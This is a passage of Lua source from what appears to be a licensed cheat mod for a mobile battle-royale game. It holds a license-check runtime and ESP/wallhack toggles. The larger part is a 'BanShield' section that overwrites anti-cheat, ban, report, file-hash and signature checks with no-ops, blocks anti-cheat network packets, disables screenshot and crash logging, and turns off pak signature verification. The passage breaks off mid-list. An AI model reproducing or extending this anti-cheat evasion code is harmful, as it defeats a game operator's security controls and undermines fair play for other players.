                anchors.Minimum, anchors.Maximum = vector(0.5, 0.5), vector(0.5, 0.5)
                slot:SetAnchors(anchors)
                slot:SetAlignment(vector(0.5, 0.5))
                slot:SetPosition(vector(0, 0))
                visibility(data.Container, passive)
            end)
            if not ok then detach(data); return false, "WELCOME_BUILD_FAILED" end
            data.Visible = true
            UI._data = data
            UI._shown = true
            return true
        end
        function UI:Hide() if UI._data then detach(UI._data) end; UI._data = nil end
        function UI:IsShown() return UI._shown == true end
        return UI
    end
    return Module
end)()
_G.MasterWelcomeUI = MasterWelcomeUI

-- ============================================================================
-- 4. LICENSE RUNTIME
-- ============================================================================
local MasterLicenseRuntime = (function()
    local Runtime = {}
    Runtime.__index = Runtime
    local function finite(n)
        return type(n) == 'number' and n == n and n >= 0 and n < math.huge
    end
    local function read(o, k)
        if o == nil then return nil end
        local ok, v = pcall(function() return o[k] end)
        if ok then return v end
    end
    local function static(o, k, ...)
        local fn = read(o, k)
        if type(fn) ~= 'function' then return nil end
        local ok, v = pcall(fn, ...); if ok then return v end
    end
    local function call(o, k, ...)
        local fn = read(o, k)
        if type(fn) ~= 'function' then return nil end
        local ok, v = pcall(fn, o, ...); if ok then return v end
    end
    local function validConfig(c)
        return type(c) == 'table' and type(c.url) == 'string' and c.url:match('^https://') ~= nil
            and type(c.game) == 'string' and #c.game > 0
            and type(c.secret) == 'string' and #c.secret > 0
            and finite(c.timeout) and c.timeout > 0 and finite(c.clockSkew)
    end
    function Runtime.new(env, config, Core, LoginUI)
        local self = setmetatable({
            env = env or _G, reason = 'login_required', active = false,
            ready = false, disposed = false, uiRetryAt = 0, uiFailures = 0
        }, Runtime)
        if not validConfig(config) or type(Core) ~= 'table' or type(Core.new) ~= 'function'
            or type(Core.Primitives) ~= 'table' then
            self.reason = 'license_dependencies_unavailable'; return self
        end
        local cfg = {}
        for k, v in pairs(config) do cfg[k] = v end
        self.timeout = cfg.timeout
        if type(LoginUI) == 'table' and type(LoginUI.new) == 'function' then
            local ok, ui = pcall(LoginUI.new, self.env)
            if ok and type(ui) == 'table' then self.ui = ui end
        end
        if type(_G.MasterWelcomeUI) == 'table' and type(_G.MasterWelcomeUI.new) == 'function' then
            local okW, w = pcall(_G.MasterWelcomeUI.new, self.env)
            if okW and type(w) == 'table' then self.welcome = w end
        end
        self.welcomeShownThisSession = (_G.__MASTER_WELCOME_SHOWN_SESSION == true)
        self.welcomeScheduledAt = nil
        self.welcomeDelaySeconds = 3.0
        self.autoLoginAttempted = false
        self.submit = function(key) return self:login(key) end
        local ok, auth = pcall(Core.new, cfg, {
            clock = function() return self:_clock() end,
            wall = function()
                local value = static(read(self.env, 'os'), 'time')
                if finite(value) and value > 0 then return value end
            end,
            serial = function(key)
                local client = read(self.env, 'Client')
                local value = static(client, 'GetPhoneDeviceID')
                assert(type(value) == 'string' and #value > 0 and #value <= 512,
                    'DEVICE_ID_UNAVAILABLE')
                return Core.Primitives.name_uuid('MASTER-LUA-V1\0' .. key .. '\0' .. value)
            end,
            decode = function(raw)
                local json = self:_module('json', nil, 'common.json_util', 'decode')
                assert(json, 'JSON_UNAVAILABLE')
                return json.decode(raw)
            end,
            post = function(url, headers, body, callback, timeout)
                local manager = read(self.env, 'ModuleManager')
                local config = read(manager, 'CommonModuleConfig')
                local getter = read(manager, 'GetModule')
                assert(type(getter) == 'function' and config, 'HTTP_MANAGER_UNAVAILABLE')
                local http = getter(read(config, 'http_manager'))
                local post = read(http, 'Post')
                assert(type(post) == 'function', 'HTTP_POST_UNAVAILABLE')
                return post(http, url, headers, body, nil, callback, timeout)
            end,
            status = function(message, phase)
                self.active = false
                self.reason = phase == 'active' and 'waiting_maintenance' or 'login_required'
                self:_ui('SetStatus', message)
                self:_ui('SetBusy', phase == 'pending')
                if phase == 'active' then self:_ui('Hide') end
            end,
        })
        if ok and type(auth) == 'table' then self.auth = auth
        else self.reason = 'license_initialization_unavailable' end
        return self
    end
    function Runtime:_module(cache, globalName, path, method)
        local found = globalName and read(self.env, globalName)
        if type(read(found, method)) == 'function' then return found end
        found = self[cache]
        if type(read(found, method)) == 'function' then return found end
        local loader = read(self.env, 'require')
        if type(loader) == 'function' then
            local ok, value = pcall(loader, path)
            if ok and type(read(value, method)) == 'function' then
                self[cache] = value; return value
            end
        end
    end
    function Runtime:_valid(object)
        if object == nil then return false end
        if static(read(self.env, 'slua'), 'isValid', object) == true then return true end
        return call(read(self.env, 'Game'), 'IsValid', object) == true
    end
    function Runtime:_clock()
        local world = static(read(self.env, 'slua'), 'getWorld')
        if world == nil then return nil end
        local statics = read(self.env, 'GameplayStatics') or self.statics
        if type(read(statics, 'GetRealTimeSeconds')) ~= 'function' then
            local loader = read(self.env, 'import')
            if type(loader) == 'function' then
                local ok, value = pcall(loader, 'GameplayStatics')
                if ok then statics = value end
            end
        end
        if type(read(statics, 'GetRealTimeSeconds')) ~= 'function' then return nil end
        self.statics = statics
        local now = static(statics, 'GetRealTimeSeconds', world)
        if finite(now) then return now, world end
    end
    function Runtime:_readGameplay(world)
        local data = read(self.env, 'GameplayData') or self.gameplayData
        if data == nil then
            local loader = read(self.env, 'require')
            if type(loader) == 'function' then
                local ok, value = pcall(loader, 'GameLua.GameCore.Data.GameplayData')
                if ok and value ~= nil then self.gameplayData = value; data = value end
            end
        end
        local pc = static(data, 'GetPlayerController')
        if not self:_valid(pc) and not self:_valid(read(pc, 'Object')) then
            pc = call(read(self.env, 'slua_GameFrontendHUD'), 'GetPlayerController')
        end
        if not self:_valid(pc) and not self:_valid(read(pc, 'Object')) then
            return nil, 'waiting_controller'
        end
        local pawn = static(data, 'GetPlayerCharacter')
        if not self:_valid(pawn) then pawn = static(data, 'GetLocalCharacter') end
        for _, method in ipairs({'GetPlayerCharacterSafety', 'GetCurPawn', 'GetPawn'}) do
            if not self:_valid(pawn) then pawn = call(pc, method) end
            if not self:_valid(pawn) then pawn = call(read(pc, 'Object'), method) end
        end
        if not self:_valid(pawn) then return nil, 'waiting_pawn' end
        local tools = self:_module('tools', nil,
            'GameLua.Mod.BaseMod.Common.UI.InGameUITools', 'GetMainControlBaseUI')
        local root = static(tools, 'GetMainControlBaseUI')
        if not self:_valid(root) then return nil, 'waiting_control_ui' end
        local status = self:_module('gameStatus', 'GameStatus',
            'client.common.game_status', 'IsInFightingStatus')
        local loading = self:_module('loading', nil,
            'client.slua.logic.loading.logic_loading', 'IsShowing')
        if not status or not loading then return nil, 'readiness_services_unavailable' end
        if static(status, 'IsInFightingStatus') ~= true then return nil, 'waiting_gameplay' end
        if static(loading, 'IsShowing') ~= false then return nil, 'waiting_loading' end
        return {world = world, controller = pc, pawn = pawn, root = root}
    end
    local function same(a, b)
        return a and b and a.world == b.world and a.controller == b.controller
            and a.pawn == b.pawn and a.root == b.root
    end
    function Runtime:_ui(method, ...)
        local fn = read(self.ui, method)
        if type(fn) ~= 'function' then return false, 'UI_UNAVAILABLE' end
        local ok, value, reason = pcall(fn, ...)
        if not ok then return false, 'UI_TEMPORARILY_UNAVAILABLE' end
        return value, reason
    end
    function Runtime:_clearReadiness(reason)
        self.active, self.ready = false, false
        self.identity, self.readySince, self.maintenanceAt, self.maintenanceWorld = nil, nil, nil, nil
        self.reason = reason
        self:_ui('Hide')
    end
    function Runtime:_showPanel(now, state, blocked, initialKey)
        if now < self.uiRetryAt then return false end
        local shown, uiReason
        if blocked then shown, uiReason = self:_ui('ShowNotice', state.message)
        else shown, uiReason = self:_ui('Show', self.submit, initialKey) end
        if shown then
            self.uiFailures, self.uiError = 0, nil
            self:_ui('SetStatus', state.message)
            self:_ui('SetBusy', blocked or state.pending)
        else
            self.uiFailures = self.uiFailures + 1
            self.uiRetryAt = now + (self.uiFailures >= 10 and 5 or 1)
            self.uiError = type(uiReason) == 'string' and uiReason:match('^UI_[A-Z_]+$')
                or 'UI_UNAVAILABLE'
        end
        return shown == true
    end
    function Runtime:update()
        if self.disposed then self.reason = 'disposed'; return false end
        if not self.auth then return false end
        local tickOK = pcall(self.auth.Tick)
        if not tickOK then
            self.auth.FailClosed('License maintenance unavailable.')
            self:_clearReadiness('license_maintenance_unavailable'); return false
        end
        local now, world = self:_clock()
        if not now then self:_clearReadiness('clock_unavailable'); return false end
        local ready, reason = self:_readGameplay(world)
        if not ready then self:_clearReadiness(reason); return false end
        if not same(self.identity, ready) or not self.readySince or now < self.readySince then
            self.identity, self.readySince = ready, now
        end
        self.ready = now - self.readySince >= 3
        self.maintenanceAt, self.maintenanceWorld = now, world
        self.active = self.ready and self.auth.IsAuthorized()
        if not self.ready then
            self.reason = 'waiting_stable_gameplay'; self:_ui('Hide'); return false
        end
        local state = self.auth.GetState()
        if self.active then
            self.reason = 'active'
            self:_ui('Hide')
            if self.welcome and not self.welcomeShownThisSession then
                if not self.welcomeScheduledAt then self.welcomeScheduledAt = now end
                if self.welcomeScheduledAt
                    and (now - self.welcomeScheduledAt) >= self.welcomeDelaySeconds then
                    local shown = false
                    pcall(function()
                        if self.welcome:Show() then shown = true end
                    end)
                    if shown then
                        self.welcomeShownThisSession = true
                        _G.__MASTER_WELCOME_SHOWN_SESSION = true
                        self.welcomeScheduledAt = nil
                    else
                        self.welcomeScheduledAt = now
                    end
                end
            end
            return true
        end
        self.reason = 'login_required'
        -- Restore the previously successful key into the login box.
        -- The user still presses LOGIN/OK to authenticate again.
        local rememberedKey = nil
        pcall(function()
            if self.auth and type(self.auth.GetSavedKey) == 'function' then
                rememberedKey = self.auth.GetSavedKey()
            end
            if not rememberedKey then
                local g = rawget(_G, '__UX_SAVED_LICENSE_KEY')
                if type(g) == 'string' and #g > 0 then rememberedKey = g end
            end
        end)
        self.rememberedKey = rememberedKey

        if state.restartRequired or state.phase == 'expired' or state.phase == 'tampered' then
            self.reason = state.restartRequired and 'restart_required' or state.phase
            self:_showPanel(now, state, true); return false
        end
        if not self:_showPanel(now, state, false, rememberedKey) and self.uiError then
            self.reason = 'login_ui_unavailable'
        end
        return false
    end
    function Runtime:isActive()
        if self.disposed or not self.auth or not self.active or not self.ready then return false end
        if not self.auth.IsAuthorized() then self.active = false; return false end
        local now, world = self:_clock()
        if not now or world ~= self.maintenanceWorld or not self.maintenanceAt
            or now < self.maintenanceAt or now - self.maintenanceAt >= 3 then
            self.active = false; self.reason = 'maintenance_stale'; return false
        end
        return true
    end
    function Runtime:login(key)
        if self.disposed or not self.auth then return false end
        if self.auth.IsAuthorized() then return true end
        local now, world = self:_clock()
        if not self.ready or not now or world ~= self.maintenanceWorld
            or not self.maintenanceAt or now < self.maintenanceAt
            or now - self.maintenanceAt >= 3 then return false end
        local identity = self:_readGameplay(world)
        if not same(identity, self.identity) then
            self:_clearReadiness('waiting_stable_gameplay'); return false
        end
        local ok, accepted = pcall(self.auth.Login, key)
        if not ok then self.auth.FailClosed('Login could not start.'); return false end
        return accepted == true
    end
    function Runtime:getStatus()
        local active = self:isActive()
        local state = self.auth and self.auth.GetState() or {}
        return {
            authorized = active, sessionAuthorized = state.authorized == true,
            phase = state.phase or 'locked',
            message = state.message or 'License dependencies unavailable.',
            reason = self.reason, pending = state.pending == true,
            gameplayReady = self.ready, expiresAt = state.expiresAt,
            accessPolicy = 'game_session', expiryCheckPolicy = 'login_only',
            clockProtection = 'login_only', periodicRecheck = false,
            loginDelaySeconds = 3, restartRequired = state.restartRequired == true,
            uiError = self.uiError,
            lastRequestLatencyMs = state.lastRequestLatencyMs,
            latencyScope = 'license_http_round_trip', disposed = self.disposed
        }
    end
    function Runtime:logout()
        self.active = false
        if self.auth then self.auth.Logout() end
        self.reason = 'login_required'; return true
    end
    function Runtime:dispose()
        if self.disposed then return true end
        self:logout(); self.disposed = true; self.ready = false
        self:_ui('Destroy'); self.reason = 'disposed'
        self.submit = nil
        return true
    end
    return Runtime
end)()


-- ============================================================================
-- AHMAD AUTH BOOTSTRAP / FEATURE GATE
-- ============================================================================
local masterESPLicenseInstance

local function masterESPEnsureLicense()
    if masterESPLicenseInstance then return end
    local host = setmetatable({GameplayData = GameplayData}, {__index = _ENV})
    masterESPLicenseInstance = MasterLicenseRuntime.new(
        host, MasterLicenseConfig, MasterLicenseCore, MasterLoginUI)
end

local function AHMADAuthActive()
    if not masterESPLicenseInstance then
        masterESPEnsureLicense()
    end
    local active = false
    pcall(function()
        active = masterESPLicenseInstance and masterESPLicenseInstance:isActive() == true
    end)
    return active
end

_G.AHMADAuthActive = AHMADAuthActive

function _G.MasterLicenseLogin(key)
    masterESPEnsureLicense()
    if not masterESPLicenseInstance then return false, 'license_unavailable' end
    local ok, result = pcall(masterESPLicenseInstance.login, masterESPLicenseInstance, key)
    if not ok then return false, 'license_unavailable' end
    return result
end

function _G.MasterLicenseLogout()
    if not masterESPLicenseInstance then return false end
    return pcall(masterESPLicenseInstance.logout, masterESPLicenseInstance)
end

function _G.MasterLicenseStatus()
    masterESPEnsureLicense()
    if not masterESPLicenseInstance then
        return {authorized = false, phase = 'locked', message = 'license_unavailable'}
    end
    local ok, value = pcall(masterESPLicenseInstance.getStatus, masterESPLicenseInstance)
    return ok and value or {authorized = false, phase = 'locked'}
end

local function AHMADAuthTick()
    if masterESPLicenseInstance then
        pcall(masterESPLicenseInstance.update, masterESPLicenseInstance)
    end
    pcall(function()
        local ticker = require("common.time_ticker")
        if ticker and ticker.AddTimerOnce then
            ticker.AddTimerOnce(0.5, AHMADAuthTick)
        end
    end)
end

masterESPEnsureLicense()
AHMADAuthTick()
print("[AUTH] Ahmad feature gate initialized: login required.")
end -- AUTH GATE lexical scope


-- ============================================================================
-- LEGACY LICENSE API COMPATIBILITY BRIDGE
-- ============================================================================
_G.LicenseValid = true
_G.ModsEnabled = true

local function SyncLegacyLicenseState()
  local active = false
  pcall(function()
    active = AHMADAuthActive() == true
  end)
  _G.LicenseValid = active
  _G.ModsEnabled = active
  return active
end

_G.IsLicenseOK = function()
  return SyncLegacyLicenseState()
end

_G.License_ReadKey = function()
  if masterESPLicenseInstance and masterESPLicenseInstance.auth
      and type(masterESPLicenseInstance.auth.GetSavedKey) == "function" then
    local ok, key = pcall(masterESPLicenseInstance.auth.GetSavedKey)
    if ok and type(key) == "string" then return key end
  end
  local key = rawget(_G, "__UX_SAVED_LICENSE_KEY")
  return type(key) == "string" and key or ""
end

_G.License_GetHWID = function()
  return nil
end

_G.License_API_URL = "https://grwauth.lat/connect"

_G.License_Validate = function(callback)
  local function check()
    local active = SyncLegacyLicenseState()
    if active then
      if type(callback) == "function" then pcall(callback, true) end
      return
    end
    if masterESPLicenseInstance then
      pcall(masterESPLicenseInstance.update, masterESPLicenseInstance)
    end
    local okTicker, ticker = pcall(require, "common.time_ticker")
    if okTicker and ticker and ticker.AddTimerOnce then
      ticker.AddTimerOnce(0.5, check)
    end
  end
  check()
end

-- Keep the legacy state synchronized with the new runtime.
local function LegacyLicenseSyncTick()
  SyncLegacyLicenseState()
  local okTicker, ticker = pcall(require, "common.time_ticker")
  if okTicker and ticker and ticker.AddTimerOnce then
    ticker.AddTimerOnce(0.5, LegacyLicenseSyncTick)
  end
end
LegacyLicenseSyncTick()

_G.Aegis = _G.Aegis or {}
_G.Aegis.Up = _G.Aegis.Up or {}
local A = _G.Aegis

A.Config = A.Config or {
  Chams = false,
  WallVehicle = false,
  Antenna = false,
  MeterMarks = false,
  Ipad = false,
  IpadFov = 120,
  HighFps = false,
  Weapons = false
}

local tick = nil
pcall(function() tick = require("common.time_ticker") end)
local function Later(seconds, fn, allowSync)
  if tick and tick.AddTimerOnce then
    tick.AddTimerOnce(seconds, fn)
  elseif allowSync then
    fn()
  end
end

local Shield = {}

local function NoOp() return true end
local function NoFalse() return false end
local function NoZero() return 0 end
local function NoNil() return nil end
local function NoList() return {} end
local function NoString() return "" end

local function MuteObject(obj)
  if type(obj) ~= "table" then return end
  for k, v in pairs(obj) do
    if type(v) == "function" and type(k) == "string" and
      (k:find("Report") or k:find("Send") or k:find("Upload") or k:find("Verify") or
       k:find("Check") or k:find("Validate") or k:find("Scan") or k:find("Detect") or
       k:find("Collect") or k:find("Flow") or k:find("Heartbeat") or k:find("Record") or
       k:find("Trace") or k:find("Replay") or k:find("Save")) then
      pcall(function() obj[k] = NoOp end)
    end
  end
end

local BanShield = {}

function BanShield.KillBanFunctions()
  pcall(function()
    local banFuncs = {
      "BanPlayer", "BanUser", "ReportBan", "SendBanReport",
      "DetectBan", "CheckBan", "ValidateBan", "ProcessBan",
      "BanKick", "KickPlayer", "ForceLogout", "DisconnectPlayer",
      "ReportSuspicious", "ReportCheat", "ReportHack",
      "OnCheatDetected", "OnHackDetected", "OnViolationDetected",
      "AntiCheatReport", "CheatDetection", "ViolationReport",
      "SecurityViolation", "IntegrityCheck", "SignatureVerify",
      "TssSdkReport", "TssSdkBan", "TssSdkKick",
      "ReportModifierException", "ReportMemoryException",
      "ReportAvatarException", "ReportSpeedHack",
      "ReportWallHack", "ReportAimBot", "ReportESP",
      "ReportModdedFiles", "DetectCheat", "OnBanNotice", "OnKickNotice",
      "ProcessBanNotice", "HandleBanNotice", "ShowBanUI", "ShowKickUI"
    }
    for _, fn in ipairs(banFuncs) do
      if _G[fn] then _G[fn] = function() return true end end
      if _G.GameplayCallbacks and _G.GameplayCallbacks[fn] then
        _G.GameplayCallbacks[fn] = function() return true end
      end
    end
  end)
end

function BanShield.SpoofSubsystems()
  pcall(function()
    local mgr = require("GameLua.GameCore.Module.Subsystem.SubsystemMgr")
    if not mgr then return end
    local banSubs = {
      "AntiCheatSubsystem", "BanSubsystem", "PlayerBanSubsystem",
      "CheatDetectionSubsystem", "SecuritySubsystem",
      "BanManagerSubsystem", "KickBanSubsystem",
      "TssSdkSubsystem", "HiggsBosonSubsystem",
      "IntegrityCheckSubsystem", "SignatureVerifySubsystem",
      "PlayerSecurityInfoSubsystem", "OperationalStatsSubsystem",
      "ModifierExceptionSubsystem", "MemoryCheckSubsystem"
    }
    for _, name in ipairs(banSubs) do
      local sub = mgr:Get(name)
      if sub then
        pcall(function()
          for k, v in pairs(sub) do
            if type(v) == "function" and type(k) == "string" then
              if k:find("Ban") or k:find("Kick") or k:find("Report") or
                 k:find("Detect") or k:find("Check") or k:find("Verify") or
                 k:find("Validate") or k:find("Process") or k:find("Send") or
                 k:find("Upload") or k:find("Notify") or k:find("Warn") then
                sub[k] = function() return true end
              end
            end
          end
          sub.bBanned = false
          sub.bKicked = false
          sub.bSuspended = false
          sub.BanCount = 0
          sub.WarningCount = 0
          sub.SuspicionScore = 0
        end)
      end
    end
  end)
end

function BanShield.BlockNet()
  pcall(function()
    if NetUtil and NetUtil.SendPacket then
      local orig = NetUtil.SendPacket
      local banPackets = {
        ["ReportCheat"]=1, ["ReportHack"]=1, ["ReportSuspicious"]=1,
        ["ReportBan"]=1, ["SendBanReport"]=1, ["BanPlayer"]=1,
        ["KickPlayer"]=1, ["CheatDetection"]=1, ["AntiCheatReport"]=1,
        ["ViolationReport"]=1, ["SecurityViolation"]=1,
        ["IntegrityCheck"]=1, ["SignatureVerify"]=1,
        ["TssSdkReport"]=1, ["TssSdkBan"]=1, ["TssSdkKick"]=1,
        ["tss_sdk_report"]=1, ["tss_sdk_ban"]=1, ["tss_sdk_kick"]=1,
        ["detect_cheat"]=1, ["ban_player"]=1, ["kick_player"]=1,
        ["report_aim_bot"]=1, ["report_esp"]=1, ["report_speed_hack"]=1,
        ["report_wall_hack"]=1, ["report_modded_files"]=1,
        ["client_anti_cheat_report"]=1, ["report_memory_exception"]=1,
        ["report_avatar_exception"]=1, ["report_script_exception"]=1,
        ["report_lua_violation"]=1, ["report_pak_modified"]=1,
        ["report_signature_fail"]=1, ["report_integrity_fail"]=1,
        ["OperationalStats"]=1, ["ReportOperationalStats"]=1,
        ["on_tss_sdk_anti_data"]=1, ["on_ban_notice"]=1, ["on_kick_notice"]=1,
        ["report_players_ping"]=1, ["report_player_ip"]=1,
        ["report_net_saturate"]=1, ["report_unrealnet_exception"]=1
      }
      NetUtil.SendPacket = function(packetName, ...)
        if banPackets[packetName] then return nil end
        return orig(packetName, ...)
      end
    end

    if _G.SendRPC then
      local origRpc = _G.SendRPC
      _G.SendRPC = function(rpcName, ...)
        if not rpcName then return origRpc(rpcName, ...) end
        local lower = string.lower(tostring(rpcName))
        if lower:find("ban") or lower:find("kick") or lower:find("report")
          or lower:find("cheat") or lower:find("hack") or lower:find("violation")
          or lower:find("verify") or lower:find("integrity") then
          return nil
        end
        return origRpc(rpcName, ...)
      end
    end
  end)
end

function BanShield.KillTssSdk()
  pcall(function()
    local tss = package.loaded["TssSdk"] or _G.TssSdk
    if tss then
      tss.GetFileMD5 = function() return "00000000000000000000000000000000" end
      tss.VerifyFileSignature = function() return true end
      tss.SendReportInfo = function() return true end
      tss.ScanMemory = function() return true end
      tss.IsEmulator = function() return false end
      tss.GetTssSdkReportInfo = function() return "" end
      tss.CheckEnvironment = function() return true end
      tss.VerifyProcess = function() return true end
      tss.ReportBan = function() return true end
      tss.ReportCheat = function() return true end
      tss.BanPlayer = function() return true end
      tss.KickPlayer = function() return true end
      tss.OnRecvData = function() return end
    end
  end)
end

function BanShield.KillGameState()
  pcall(function()
    local GD = require("GameLua.GameCore.Data.GameplayData")
    if not GD then return end
    local gs = GD.GetGameState and GD.GetGameState()
    if not gs then return end
    pcall(function()
      gs.BanPlayer = function() return true end
      gs.KickPlayer = function() return true end
      gs.ReportCheat = function() return true end
      gs.ReportHack = function() return true end
      gs.OnCheatDetected = function() return true end
      gs.OnHackDetected = function() return true end
      gs.AntiCheatReport = function() return true end
      gs.ShowBanNotice = function() return end
      gs.ShowKickNotice = function() return end
      gs.ProcessBanNotice = function() return end
    end)
  end)
end

function BanShield.SpoofBanStatus()
  pcall(function()
    local GD = require("GameLua.GameCore.Data.GameplayData")
    if not GD then return end
    local pc = GD.GetPlayerController and GD.GetPlayerController()
    if not pc then return end
    pcall(function()
      pc.bBanned = false
      pc.bKicked = false
      pc.bSuspended = false
      pc.BanReason = nil
      pc.BanTime = 0
      pc.BanCount = 0
      pc.WarningCount = 0
      pc.SuspicionScore = 0
    end)
    pcall(function()
      local ps = pc.GetPlayerStateSafety and pc:GetPlayerStateSafety()
      if ps then
        ps.bBanned = false
        ps.bKicked = false
        ps.bSuspended = false
        ps.BanCount = 0
        ps.WarningCount = 0
        ps.SuspicionScore = 0
      end
    end)
  end)
end

function BanShield.Install()
  if A.Up.BanShielded then return end
  A.Up.BanShielded = true
  BanShield.KillBanFunctions()
  BanShield.SpoofSubsystems()
  BanShield.BlockNet()
  BanShield.KillTssSdk()
  BanShield.KillGameState()
  BanShield.SpoofBanStatus()
  print("[BAN BYPASS 4.6] All ban systems neutralized")
end

function Shield.NeutralizeLoaders()
  pcall(function()
    if slua and slua.getSignature then slua.getSignature = NoZero end
    local loader = package.loaded["slua.loader"] or rawget(_G, "slua_loader")
    if loader then
      loader.verifyBytecode = NoOp
      loader.checkIntegrity = NoOp
      if loader.disableSignatureCheck then loader.disableSignatureCheck = NoOp end
    end
    local ser = package.loaded["slua.serialize"]
    if ser then ser.check = NoOp; ser.verify = NoOp end
    if jit and jit.attach then jit.attach(function() end, "bc") end
    if _G.slua_verify then _G.slua_verify = NoOp end
    if _G.check_slua_integrity then _G.check_slua_integrity = NoOp end
  end)
end

function Shield.NeutralizeHashes()
  pcall(function()
    local console = import("KismetSystemLibrary")
    if console then
      console.ExecuteConsoleCommand(nil, "pak.DisablePakSignatureCheck 1")
      console.ExecuteConsoleCommand(nil, "pakchunk.EnableSignatureCheck 0")
      console.ExecuteConsoleCommand(nil, "s.VerifyPak 0")
      console.ExecuteConsoleCommand(nil, "sig.Check 0")
      console.ExecuteConsoleCommand(nil, "security.DisableChecks 1")
    end
    local CMode = import("CreativeModeBlueprintLibrary")
    if CMode then
      CMode.MD5HashByteArray = NoString
      CMode.MD5HashFile = NoString
      CMode.GetContentDiffData = function() return true, "OK" end
      CMode.VerifyFileIntegrity = NoOp
    end
    if _G.MD5Hash then _G.MD5Hash = NoString end
    if _G.CRC32 then _G.CRC32 = NoZero end
    if _G.SHA1 then _G.SHA1 = NoString end
    local fhc = package.loaded["common.file_hash_checker"]
    if fhc then
      fhc.CheckFileMD5 = NoOp
      fhc.VerifyAll = NoOp
      fhc.GetHash = NoString
    end
    local tss = package.loaded["TssSdk"] or _G.TssSdk
    if tss then
      tss.GetFileMD5 = NoString
      tss.VerifyFileSignature = NoOp
      tss.OnRecvData = function(data)
        if type(data) ~= "string" then return end
        local lower = string.lower(data)
        if lower:find("report", 1, true) or lower:find("exception", 1, true) or lower:find("cheat", 1, true) or lower:find("violation", 1, true) or lower:find("hack", 1, true) or lower:find("verify", 1, true) then return end
      end
      tss.SendReportInfo = NoNil
      tss.ScanMemory = NoOp
      tss.IsEmulator = NoFalse
      tss.GetTssSdkReportInfo = NoString
      tss.CheckEnvironment = NoOp
      tss.VerifyProcess = NoOp
    end
    local stx = import("STExtraBlueprintFunctionLibrary")
    if stx then
      stx.CheckMD5 = NoOp
      stx.GetMD5 = NoString
      stx.VerifyFile = NoOp
    end
  end)
end

function Shield.NeutralizeLogs()
  pcall(function()
    local SMTD = import("ScreenshotMTDer")
    if SMTD then
      SMTD.MTDePicture = NoString
      SMTD.ReMTDePicture = NoString
      SMTD.HasCaptured = NoOp
      SMTD.TakeScreenshot = NoNil
    end
    local tl = package.loaded["TLog"] or _G.TLog
    if tl then
      tl.Info, tl.Warning, tl.Error, tl.Debug = NoOp, NoOp, NoOp, NoOp
      tl.Report, tl.Send, tl.Flush = NoOp, NoOp, NoOp
    end
    local cs = package.loaded["CrashSight"] or _G.CrashSight
    if cs then
      cs.ReportException, cs.SetCustomData, cs.Log = NoOp, NoOp, NoOp
      cs.SendCrash, cs.ReportUserException = NoOp, NoOp
    end
    local gr = package.loaded["GameLua.Mod.BaseMod.GamePlay.GameReport.GameReportUtils"]
    if gr then
      gr.BugglyPostExceptionFull = NoFalse
      gr.CheckCanBugglyPostException = NoFalse
      gr.ReplayReportData, gr.ReportGameException, gr.PostException = NoOp, NoOp, NoOp
    end
    local ctr = package.loaded["client.slua.logic.report.ClientToolsReport"]
    if ctr then ctr.SendReport, ctr.SendException, ctr.UploadLog = NoOp, NoOp, NoOp end
    for _, sdk in ipairs({"Firebase", "Adjust", "AppsFlyer", "FacebookAnalytics", "GameAnalytics"}) do
      local s = _G[sdk]
      if s then
        s.logEvent, s.trackEvent = NoOp, NoOp
        s.setEnabled = NoFalse
        s.sendEvent, s.report = NoOp, NoOp
      end
    end
  end)
end

function Shield.NeutralizeSkins()
  pcall(function()
    local pt = package.loaded["client.slua.logic.download.report.puffer_tlog"]
    if pt then
      pt.ReportEvent, pt.ReportDownloadResult = NoOp, NoOp
      pt.ReportODPTDError, pt.ReportSkinError = NoOp, NoOp
    end
    local av = package.loaded["AvatarUtils"]
    if av then
      av.CheckIsWeaponInBlackList = NoFalse
      av.IsValidAvatar = NoOp
      av.CheckAvatarIntegrity = NoOp
      av.ReportInvalidAvatar = NoNil
    end
    local eq = package.loaded["client.slua.logic.report.EquipmentExceptionReport"]
    if eq then eq.Report, eq.SendException = NoOp, NoOp end
  end)
end

local ReportFlowNames = {
  "ReportAimFlow", "ReportHitFlow", "ReportAttackFlow", "ReportSecAttackFlow",
  "ReportFireArms", "ReportVerifyInfoFlow", "ReportMrpcsFlow", "ReportPlayerBehavior",
  "ReportTeammatHurt", "ReportMisKillByTeammate", "ReportForbitPick",
  "ReportPlayerMoveRoute", "ReportPlayerPosition", "ReportVehicleMoveFlow",
  "ReportSecTgameMovingFlow", "ReportParachuteData", "ReportEquipmentFlow",
  "ReportPlayersPing", "ReportPlayerIP", "ReportPlayerFramePingRecord",
  "ReportDSNetSaturation", "ReportNetContinuousSaturate", "ReportDSNetRate",
  "ReportCircleFlow", "ReportSecMrpcsFlow", "SendTssSdkAntiDataToLobby",
  "SendClientStats", "SendServerAvgTickDelta", "SwiftHawk", "ClientSwiftHawk",
  "ClientSwiftHawkWithParams", "ClientSecMrpcsFlow", "MrpcsData"
}
local BlockPacketNames = {
  ["ReportAttackFlow"]=1, ["ReportSecAttackFlow"]=1, ["ReportFireArms"]=1,
  ["ReportVerifyInfoFlow"]=1, ["ReportMrpcsFlow"]=1, ["ReportPlayerBehavior"]=1,
  ["ReportTeammatHurt"]=1, ["ReportPlayerMoveRoute"]=1, ["ReportPlayerPosition"]=1,
  ["report_parachute_data"]=1, ["on_tss_sdk_anti_data"]=1, ["ReportAimFlow"]=1,
  ["ReportHitFlow"]=1, ["ReportCircleFlow"]=1, ["report_players_ping"]=1,
  ["report_player_ip"]=1, ["report_net_saturate"]=1, ["report_speed_hack"]=1,
  ["report_wall_hack"]=1, ["report_aim_bot"]=1, ["report_esp_usage"]=1,
  ["report_modded_files"]=1, ["detect_cheat"]=1, ["ban_player"]=1,
  ["client_anti_cheat_report"]=1, ["ClientSecMrpcsFlow"]=1, ["MrpcsData"]=1,
  ["CheckReportSecAttackFlow"]=1, ["CheckReportSecAttackFlowWithAttackFlow"]=1,
  ["RPC_ClientCoronaLab"]=1, ["CoronaLabReport"]=1, ["CoronaLabData"]=1,
  ["PlayerSecurityInfo"]=1, ["ReportSecurityInfo"]=1, ["SendSecurityData"]=1,
  ["ClientCircleFlow"]=1, ["bReportedModifierException"]=1, ["ReportModifierException"]=1,
  ["RPC_Server_ReportSimulateCharacterLocation"]=1, ["ReportSimulateCharacterLocation"]=1,
  ["RPC_Client_ShootVertifyRes"]=1, ["BulletHitInfoUploadData"]=1, ["ShootVerifyFailed"]=1,
  ["report_unrealnet_exception"]=1, ["tss_sdk_report"]=1, ["SwiftHawk"]=1,
  ["ClientSwiftHawk"]=1, ["ClientSwiftHawkWithParams"]=1, ["SwiftHawkReport"]=1,
